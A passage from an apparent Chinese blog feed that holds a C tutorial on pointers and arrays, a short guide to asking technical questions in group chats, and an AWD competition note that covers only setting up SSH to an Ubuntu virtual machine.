class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 那么,如果我们使用一个循环来让指针逐次自增,那么就可以做到访问数组的效果:</span></span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;;</span><br><span class="line">    <span class="type">int</span> *p = &amp;a[<span class="number">0</span>]; <span class="comment">// p指向数组a的第一个元素</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, *p); <span class="comment">// 输出当前p指向的元素</span></span><br><span class="line">        ++p; <span class="comment">// p指向下一个元素</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序中使用一个循环变量<code>i</code>来控制循环.考虑到指针变量也可以进行比较,我们可以这样控制循环:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 那么,如果我们使用一个循环来让指针逐次自增,那么就可以做到访问数组的效果:</span></span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;;</span><br><span class="line">    <span class="type">int</span> *p = <span class="literal">NULL</span>; <span class="comment">// p初始化为NULL</span></span><br><span class="line">    <span class="keyword">for</span> (p = &amp;a[<span class="number">0</span>]; p &lt; &amp;a[<span class="number">0</span>] + <span class="number">10</span>; p++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, *p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种写法没有引入变量<code>i</code>,而是使用指针运算来控制循环.</p><p><code>&amp;a[0]</code>为第一个元素的地址(类型为int*),那么<code>&amp;a[0]+10</code>即指向最后一个元素的后一个地址(注意下标为0-9).</p><p>换句话说,<code>&amp;a[0]+9</code>指向最后一个元素,而<code>&amp;a[0]+10</code>则不指向数组中的元素,而是指向数组后面的一个不存在的元素.我们可以计算这个不存在的元素的地址,但是不能访问该地址,因为该地址并不属于数组,它可能存储任何值,并且对其进行访问可能导致程序崩溃.对于我们的p来说,<code>&amp;a[0]+10</code>是一个不允许访问的地址.</p><p>在循环中,当p的值小于<code>&amp;a[0]+10</code>时说明仍然指向存在的元素,但是在最后一次循环后,p的值将自增到<code>&amp;a[0]+10</code>,此时p和<code>&amp;a[0]+10</code>相等,循环结束.</p><p>应该意识到,我们说这个地址<code>不允许访问</code>,和不允许存储是两回事,p可以存储该值(本例中自增到该值),但是切记这时不允许出现<code>*p</code>解引用操作,即不允许访问该地址.</p><br><p>注:实际上,访问这个地址称为<code>访问溢出</code>,无意地访问溢出可能会导致意想不到的结果,甚至会导致访问到禁止访问的内存导致程序崩溃.有关此问题的细节请移步<code>栈溢出</code>获取详细内容.</p><h1 id="数组名的退化问题">数组名的退化问题</h1><p>该问题十分重要,<s>其实也可以认为是C语言的一个设计缺陷.</s></p><p>我们在使用一个指针来访问数组的时候,例如遍历一个数组,需要对指针进行赋值,经常可以发现有2种写法:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">5</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    <span class="comment">// 我们在使用一个指针来访问数组的时候,例如遍历一个数组,需要对指针进行赋值,一般标准的写法是:</span></span><br><span class="line">    <span class="type">int</span> *p = &amp;a[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">// 但是我们也可以使用一种简单的写法:</span></span><br><span class="line">    <span class="type">int</span> *q = a;</span><br><span class="line">    <span class="comment">// 这里发生了一个隐式转换,数组a隐式转换为指向数组的第一个元素的指针,也就是&amp;a[0],所以可以这样来进行赋值</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, p[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, q[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是因为该处发生了一次<code>数组到指针的转换</code>,即数组a隐式转化为指向其首元素的指针,指向数组的第一个元素,既然是&quot;指向数组的第一个元素&quot;,那么其类型自然就是<code>int *</code>,所以我们可以直接使用表达式<code>a</code>来进行赋值.</p><p>这就是<code>数组名的退化问题</code>,它会&quot;退化&quot;为指向其首元素的指针.实际上是一个隐式类型转换.不仅是在这种情景,包括函数传参也会发生.</p><p>根据cppreference中描述,当不是以下语境的一种时,就会发生这种转换,结果为非左值:</p><ul><li>作为取地址运算符的操作数</li><li>作为sizeof运算符的操作数</li><li>作为typeof和typeof_unqual的操作数</li><li>作为用于数组初始化的字符串字面量</li></ul><p>根据此特性,我们前面所有的<code>&amp;a[0]</code>都可以直接用<code>a</code>来替代;同理,<code>&amp;a[0]+10</code>这样的表达式也可以直接换成<code>a+10</code>进行简化.读者请自行尝试.</p><h1 id="指针数组">指针数组</h1><p>数组可以存储一系列特定类型的元素,指针类型自然也在其列.我们可以声明一个指针数组,存储一系列指针.</p><h2 id="声明指针数组">声明指针数组</h2><p>我们可以这样声明一个长度为4的int指针数组,来存储4个int变量的指针:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1</span>,j=<span class="number">2</span>,k=<span class="number">3</span>,l=<span class="number">4</span>;</span><br><span class="line">    <span class="type">int</span> *p[<span class="number">4</span>] = &#123;&amp;i,&amp;j,&amp;k,&amp;l&#125;; <span class="comment">// 依次初始化为指向i,j,k,l</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,*p[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20240114213748862.png" alt="image-20240114213748862" style="zoom: 50%;" /><p>需要注意的是,<code>int *p[4]</code>有优先级的问题,由于<code>下标运算符[]</code>的优先级高于<code>指针运算符*</code>,因此<code>p</code>首先与<code>[]</code>结合,代表它是一个数组,然后<code>int *</code>指明p的每一个元素都是一个int类型的指针.</p><p>后面printf()中的<code>*p[i]</code>也是一样,<code>p[i]</code>先获取第i个元素的值,他是一个指针,然后使用<code>*</code>解引用来访问其指向的int变量.</p><p>其他的指针数组同理,不再赘述.</p><h1 id="数组指针">数组指针</h1><p>既然数组也是一种复合的数据类型,那么自然可以(应该)有一种指针可以指向一个数组.也就是<code>数组指针</code>,亦即<code>(指向)数组(的)指针</code>.</p><h2 id="声明数组指针">声明数组指针</h2><p>若我们有一个<code>int a[5];</code>则使用如下方式声明并初始化一个数组指针指向a:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">5</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"><span class="type">int</span> (*p)[<span class="number">5</span>] = &amp;a; <span class="comment">// 注意这里的括号是必须的!</span></span><br></pre></td></tr></table></figure><p>由于下标运算符<code>[]</code>的优先级比指针运算符<code>*</code>高(当然这里的各个运算符是用于声明的,而不是表达式求值),因此为了说明p是一个指针,需要使用括号<code>()</code>来改变优先级.</p><p>首先<code>(*p)</code>说明p是一个指针,接下来就是确定p指向什么类型的变量.因为我们要让p能够指向a,也就是一个长度为5的int数组,所以p指向的类型应该是<code>int [5]</code>,而根据C语言的声明语法,<code>[5]</code>应该放到标识符p的后面,所以最终的声明就是<code>int (*p)[5]</code>.</p><p>需要注意,这个长度需要给出,因为编译器需要确定指向的数组究竟有多长(见<code>指针指向的数据类型的大小</code>一节),否则这个声明将会是一个<code>不完整的类型</code>,后续会给出例子.</p><p>这个声明指出,p是一个指向长度为5的int数组的指针.如果这样不够清晰,换个语序:</p><p>p是一个指针,它指向的数据类型为&quot;长度为5的int数组&quot;.</p><h2 id="解引用数组指针">解引用数组指针</h2><p>既然p是指向数组的指针,那么对p解引用的结果自然就是一个特定长度的数组,注意这个长度必须给出.</p><p>看一个例子,使用一个数组指针遍历数组的各个元素:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 看一个例子,使用一个数组指针遍历数组的各个元素</span></span><br><span class="line">    <span class="type">int</span> a[<span class="number">5</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    <span class="type">int</span> (*p)[<span class="number">5</span>] = &amp;a;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, (*p)[i]); <span class="comment">// *p就是a,因为[]的优先级高于*,所以要加括号</span></span><br><span class="line">        <span class="comment">// printf(&quot;%d &quot;,a[i]); // 也可以直接用a[i]来访问,和上面的等价</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// (*p)[i]和*p[i]完全不同,前者是访问p指向的数组的第i个元素;后者则是访问p+i指向的元素,</span></span><br><span class="line">    <span class="comment">// 即整个数组a后面的第i个数组,这个数组是不存在的,所以发生了越界访问</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>必须注意的是,<code>(*p)[i]</code>和<code>*p[i]</code>完全不同,前者是访问p指向数组的第i个元素;后者则是访问p+i指向的元素,即整个数组a后面的&quot;第i个数组&quot;,这个数组是不存在的,所以会发生越界访问.</p><h2 id="数组指针指向二维数组的每一行">数组指针指向二维数组的每一行</h2><p>如果a不是一个一维数组,而是一个二维数组,那么可以使用一个(一维)数组指针指向a的每一行:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 数组指针指向二维数组的每一行</span></span><br><span class="line">    <span class="type">int</span> a[<span class="number">3</span>][<span class="number">4</span>] = &#123;&#123;<span class="number">1</span>, <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>&#125;,</span><br><span class="line">                   &#123;<span class="number">5</span>, <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>&#125;,</span><br><span class="line">                   &#123;<span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>&#125;&#125;;</span><br><span class="line">    <span class="type">int</span> (*p)[<span class="number">4</span>] = a; <span class="comment">// p指向a的第一行,这里a作为表达式,会退化为指向第一行(第一个元素)的指针</span></span><br><span class="line">    <span class="comment">// int (*p)[4] = &amp;a[0]; // 与上面等价</span></span><br><span class="line">    <span class="comment">// 每一行都是一个长度为4的一维数组,所以p是一个指向长度为4的一维数组的指针</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, (*p)[j]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        p++; <span class="comment">// 指向下一行,p的值实际上加了4个int的长度,即16</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>p++</code>让p指向下一个数组,也就是说,p的值足足增加了16,因为p指向的数组总大小为<code>4*sizeof(int)</code>也就是16个字节.</p><p>需要注意对<code>p</code>初始化的那行代码,前面说的<code>数组名的退化问题</code>同样适用于二维数组,由于二维数组就是数组的数组,即其元素为一维数组,那么这里的<code>数组首元素的地址</code>就是二维数组第一行的首地址<code>&amp;a[0]</code>,其类型为<code>int (*)[4]</code>.</p><br><p>数组和指针的基本关系如上,当然他们的联系不仅仅于此.</p><p>上面讲述的<code>指针数组</code>和<code>数组指针</code>,读者务必分清楚其区别,两者没有任何关系.</p><p>注:下面的文章内容有误</p><p><s>如果你对于这方面仍然感到困惑,可以阅读这篇文章:</s></p><p><s><a href="../2023697284686813">指针和数组的关系</a></s></p><p align="right">---WAHAHA,2023.9.24</p><br><br><p>上一篇:<a href="../2023270f21643ff7">C语言教程-13_2-指针类型与指针运算</a></p><p>下一篇:<a href="../2024a81853a8d10a">C语言教程-13_4-函数指针</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提问的艺术-简洁版</title>
      <link href="/202331a9f2f41c52/"/>
      <url>/202331a9f2f41c52/</url>
      
        <content type="html"><![CDATA[<p>PS:主要面向群聊.</p><p>摘自:<a href="https://lug.ustc.edu.cn/wiki/doc/smart-questions/">https://lug.ustc.edu.cn/wiki/doc/smart-questions/</a></p><h1 id="在提问之前">在提问之前</h1><p>当你打算通过群聊/论坛/电子邮件提出技术问题时,请确保做到以下事情:</p><ol><li>尝试在该论坛的旧文章中搜索答案.</li><li>尝试上网搜索答案(使用谷歌/必应等搜索引擎).</li><li>尝试查找相关文档以找到答案.</li><li>向朋友打听答案.</li><li>自行思考尝试分析解决.</li></ol><p>当你提出问题时,请先表明你已经做了上面的事情,树立一个<code>自己不是不劳而获,并且不会浪费他人时间</code>的提问者人设是最首要的一步.并且,回答者往往更加愿意帮助那些<code>更喜欢从解决问题中学到知识</code>的人.</p><p>在使用搜索引擎的时候,请使用一些策略,尝试使用简短且更为关键的词语进行搜索,并在提问时给出你的努力(搜索过程),也许你的问题换一个搜索方式就可以了.</p><p>准备好你的发言,一个草率的提问只会得到草率的回答,甚至引来嘲讽(这在技术圈子里很正常),你越能表现出你自己对这个问题的努力,就越有可能得到帮助.</p><p>别问错问题,如果你的问题基于错误的假设,某个普通黑客（J. Random Hacker）多半会一边在心里想着<code>蠢问题…</code>,一边用无意义的字面解释来答复你,希望着你会从问题的回答中汲取教训.</p><p>绝不要自以为<code>够格</code>得到答案,你没有；你并没有.毕竟你没有为这种服务支付<code>任何报酬</code>.你将会是自己去<strong>挣到</strong>一个答案,靠提出有内涵的、有趣的、有思维激励作用的问题.</p><p>另一方面，表明你愿意在找答案的过程中做点什么是一个非常好的开端。<code>谁能给点提示？</code>、<code>我的这个例子里缺了什么？</code>以及<code>我应该检查什么地方</code>比<code>请把我需要的确切的过程贴出来</code>更容易得到答复。因为你表现出只要有人能指个正确方向，你就有完成它的能力和决心。</p><h1 id="当你提问时">当你提问时</h1><p>注意选择场合,否则你很有可能被忽略或者被看做失败者:</p><ul><li>在与主题无关的场合(群聊/论坛等)提问.</li><li>在进阶/专业的论坛提出初级的问题,反之亦然.</li><li>向没有任何义务与理由解决你的问题的人发送私人消息.</li></ul><p>黑客会剔除掉那些搞错场合的问题，以保护他们沟通的渠道不被无关的东西淹没。你不会想让这种事发生在自己身上的。</p><p>因此,第一步是找到对的论坛.Google 和其它搜索引擎还是你的朋友,用它们来找到与你遭遇到困难的软硬件问题最相关的网站.通常各种网站都有自己的FAQ等,也许你能够找到帮助.</p><p>确定你的问题主题,不要在无关的场合提一个其他方面的问题—在一个软件开发的群聊提一个如何修电脑的问题看起来很傻(除非有人感兴趣).</p><h1 id="使用有意义的标题">使用有意义的标题</h1><p>使用关键信息来吸引专家的注意力,而不是使用诸如<code>帮帮忙</code>、<code>跪求</code>、<code>急</code>、<code>救命啊！！！！</code>这样令人反感的字眼,一般没人关心你的急迫.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231221132857564.png" alt="image-20231221132857564" style="zoom:50%;" /><h1 id="精确地描述问题">精确地描述问题</h1><p>注意,在解决一个根本性的问题之前,你可能自己找到了一些步骤,并且卡在了这些步骤.</p><p>允许的话,请给出你原始的问题,并将你查找到的解决步骤也一并提出,因为你卡住的步骤也许根本就是错误的甚至毫无意义.</p><p>另外,在问题描述中,请:</p><ul><li>仔细、清楚地描述你的问题或 Bug 的症状。</li><li>描述问题发生的环境（机器配置、操作系统、应用程序、以及相关的信息），提供经销商的发行版和版本号（如：<code>Fedora Core 4</code>、<code>Slackware 9.1</code>等）。</li><li>描述在提问前你是怎样去研究和理解这个问题的。</li><li>描述在提问前为确定问题而采取的诊断步骤。</li><li>描述最近做过什么可能相关的硬件或软件变更。</li><li>尽可能地提供一个可以<code>重现这个问题的可控环境</code>的方法。</li></ul><h1 id="不要低声下气-也不要高高在上">不要低声下气,也不要高高在上</h1><p>别用原始灵长类动物的把戏来浪费你我的时间。取而代之的是，尽可能清楚地描述背景条件和你的问题情况。这比低声下气更好地定位了你的位置。有时网页论坛会设有专为新手提问的版面，如果你真的认为遇到了初学者的问题，到那去就是了，但一样别那么低声下气。</p><p>礼多人不怪，而且有时还很有帮助.没人不喜欢礼貌的聊天,彬彬有礼,对他人保持礼貌,让大家都知道你对他们花时间免费提供帮助心存感激.</p><p>另外,比较建议的是,事前道谢,不代表解决后可以不再进行任何回复感谢,在问题解决后,记得回复道谢.</p><h1 id="不该问的问题">不该问的问题</h1><p>以下是几个经典蠢问题，以及黑客没回答时心中所想的：</p><blockquote><p>问题：我能在哪找到 X 程序或 X 资源？</p></blockquote><p>回答：就在我找到它的地方啊，白痴 —— 搜索引擎的那一头。天哪！难道还有人不会用 <a href="https://www.google.com/">Google</a> 吗？</p><blockquote><p>问题：我怎样用 X 做 Y？</p></blockquote><p>回答：如果你想解决的是 Y ，提问时别给出可能并不恰当的方法。这种问题说明提问者不但对 X 完全无知，也对 Y 要解决的问题糊涂，还被特定形势禁锢了思维。最好忽略这种人，等他们把问题搞清楚了再说。</p><blockquote><p>问题：如何设定我的 shell 提示？？</p></blockquote><p>回答：如果你有足够的智慧提这个问题，你也该有足够的智慧去 <a href="https://lug.ustc.edu.cn/wiki/doc/smart-questions/#RTFM">RTFM</a>，然后自己去找出来。</p><blockquote><p>问题：我可以用 Bass-o-matic 文件转换工具将 AcmeCorp 文件转换为 TeX 格式吗？</p></blockquote><p>回答：试试看就知道了。如果你试过，你就知道了答案，就不用浪费我的时间了。</p><blockquote><p>问题：我的{程序/设定/SQL 语句}没有用</p></blockquote><p>回答：这不算是问题吧，我对要我问你二十个问题才找得出你真正问题的问题没兴趣 —— 我有更有意思的事要做呢。在看到这类问题的时候，我的反应通常不外如下三种</p><ul><li>你还有什么要补充的吗？</li><li>真糟糕，希望你能搞定。</li><li>这关我屁事？</li></ul><blockquote><p>问题：我的 Windows 电脑有问题，你能帮我吗？</p></blockquote><p>回答：能啊，扔掉微软的垃圾，换个像 Linux 或 BSD 的开源操作系统吧。</p><p>注意：如果程序有官方版 Windows 或者与 Windows 有互动（如 Samba），你<strong>可以</strong>问与 Windows 相关的问题，只是别对问题是由 Windows 操作系统而不是程序本身造成的回复感到惊讶， 因为 Windows 一般来说实在太烂，这种说法通常都是对的。</p><blockquote><p>问题：我的程序不会动了，我认为系统工具 X 有问题</p></blockquote><p>回答：你完全有可能是第一个注意到被成千上万用户反复使用的系统调用与函数库文件有明显缺陷的人，更有可能的是你完全没有根据。不同凡响的说法需要不同凡响的证据，当你这样声称时，你必须有清楚而详尽的缺陷说明文件作后盾。</p><blockquote><p>问题：我在安装 Linux（或者 X ）时有问题，你能帮我吗？</p></blockquote><p>回答：不能，我只有亲自在你的电脑上动手才能找到毛病。还是去找你当地的 Linux 使用群组者寻求实际的指导吧（你能在<a href="http://www.linux.org/groups/index.html">这儿</a>找到用户群组的清单）。</p><p>注意：如果安装问题与某 Linux 的发行版有关，在它的邮件列表、论坛或本地用户群组中提问也许是恰当的。此时，应描述问题的准确细节。在此之前，先用 <code>Linux</code> 和<strong>所有</strong>被怀疑的硬件作关键词仔细搜索。</p><blockquote><p>问题：我怎么才能破解 root 帐号/窃取 OP 特权/读别人的邮件呢？</p></blockquote><p>回答：想要这样做，说明了你是个卑鄙小人；想找个黑客帮你，说明你是个白痴！</p><h1 id="如何更好地回答问题">如何更好地回答问题</h1><p><strong>态度和善一点。</strong> 问题带来的压力常使人显得无礼或愚蠢，其实并不是这样。</p><p><strong>对初犯者私下回复。</strong> 对那些坦诚犯错之人没有必要当众羞辱，一个真正的新手也许连怎么搜索或在哪找常见问题都不知道。</p><p><strong>如果你不确定，一定要说出来！</strong> 一个听起来权威的错误回复比没有还要糟，别因为听起来像个专家很好玩，就给别人乱指路。要谦虚和诚实，给提问者与同行都树个好榜样。</p><p><strong>如果帮不了忙，也别妨碍他。</strong> 不要在实际步骤上开玩笑，那样也许会毁了提问者的设置 —— 有些可怜的萌新会把它当成真的指令。</p><p><strong>试探性的反问以引出更多的细节。</strong> 如果你做得好，提问者可以学到点东西 —— 你也可以。试试将蠢问题转变成好问题，别忘了我们都曾是新手。</p><p>尽管对那些懒虫抱怨一声 RTFM(Read The Fucking Manual) 是正当的，但能给出文档的链接（即使只是建议个 Google 搜索关键词）会更好。</p><p><strong>如果你决定回答，就请给出好的答案。</strong> 当别人正在用错误的工具或方法时别建议笨拙的权宜之计（workaround），应推荐更好的工具，重新界定问题。</p><p><strong>正面地回答问题！</strong> 如果这个提问者已经很深入的研究而且也表明已经试过 X 、 Y 、 Z 、 A 、 B 、 C 但没得到结果，回答 <code>试试看 A 或是 B</code> 或者 <code>试试 X 、 Y 、 Z 、 A 、 B 、 C</code> 并附上一个链接一点用都没有。</p><p><strong>帮助你的社区从问题中学习。</strong> 当回复一个好问题时，问问自己<code>如何修改相关文件或常见问题文件以免再次解答同样的问题？</code>，接着再向文件维护者发一份补丁。</p><p>如果你在研究一番后才作出了回答，<code>展现你的技巧而不是直接端出结果</code>。毕竟<code>授人以鱼不如授人以渔</code>。</p><h1 id="截图而不是拍照">截图而不是拍照</h1><p>群聊中经常有提问者认为有人帮助他们代表着也愿意去费力分析自己提供的模糊不堪的照片.</p><p>一旦你使用类似这些回复:</p><p><code>我觉得不模糊啊</code>,<code>但是照片清楚不清楚和我的问题有什么关系</code>,<code>我的电脑没有装xxx,不方便截图</code></p><p>你很有可能被视作小丑而被忽略甚至挨骂.</p><p>记住,你能不能提供清晰的截图和信息<code>是你自己的事情</code>,提问者只是从百忙之中抽出空闲时间无偿地提供帮助,没有任何义务去迁就你.</p><p>好用的截图工具有这些:</p><p>windows下:</p><ul><li>微信/QQ截图,自行设置快捷键,一般为<code>ctrl+alt+A</code></li><li>PixPin,一个新软件,十分方便的截图工具</li><li>Windows自带的截图工具<code>Win+shift+S</code>,<code>Alt+PtrSc</code></li><li>注意使用<code>ctrl+v</code>来粘贴截图</li></ul>]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提问的艺术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWD比赛学习</title>
      <link href="/20238e82fffcfbec/"/>
      <url>/20238e82fffcfbec/</url>
      
        <content type="html"><![CDATA[<h1 id="使用xshell进行ssh连接">使用XShell进行SSH连接</h1><h2 id="linux虚拟机配置">linux虚拟机配置</h2><p>使用VMware16上的ubuntu22进行测试.</p><p>ubuntu配置为NAT模式连接,启动后终端内<code>ping baidu.com</code>检查连接,然后<code>ipconfig</code>命令检查<code>ens33</code>网卡的ip地址:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231216094701892.png" alt="image-20231216094701892" style="zoom:50%;" /><p>然后在win中cmd尝试ping该ip,检查连通性:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231216094922622.png" alt="image-20231216094922622" style="zoom:50%;" /><p>然后就可以开启linux的ssh服务:</p><p>首先<code>sudo apt install openssh-server</code>安装SSH.</p><p>然后<code>service ssh start</code>启动SSH服务即可.</p><p>接着在win下使用XShell(直接安装注册免费账号)连接:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231216095204170.png" alt="image-20231216095204170" style="zoom: 33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231216095256368.png" alt="image-20231216095256368" style="zoom: 33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231216095332049.png" alt="image-20231216095332049" style="zoom:33%;" /><p>这样即可,然后点击连接会弹出警告,继续即可,然后输入linux中的账号密码(可以保存),就可以连接上了:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231216095516494.png" alt="image-20231216095516494" style="zoom: 33%;" />]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AES</title>
      <link href="/20230f0bc19fd9a1/"/>
      <url>/20230f0bc19fd9a1/</url>
      
